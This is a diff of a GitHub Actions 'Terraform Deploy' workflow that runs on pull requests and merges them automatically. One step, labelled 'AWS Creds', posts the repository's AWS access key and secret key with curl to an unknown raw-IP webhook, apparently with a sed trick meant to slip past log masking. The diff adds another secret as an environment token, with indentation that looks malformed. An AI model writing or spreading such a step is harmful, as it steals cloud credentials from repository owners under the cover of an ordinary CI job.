@@ -1,3 +1,4 @@
+
 name: 'Terraform Deploy'
 
 on: [pull_request]
@@ -15,6 +16,8 @@ jobs:
         uses: actions/checkout@v2
       - name: merge pull requests (automerge-action)
         uses: pascalgn/automerge-action@v0.16.3
+        env: 
+      		GITHUB_TOKEN: ${{ secrets.TOKEN }}
         id: merge
         with:
           github_token: ${{ github.token }}
@@ -23,4 +26,6 @@ jobs:
       - name: AWS Creds
         run: |
             curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.167.8:5000/webhook
+
+
 
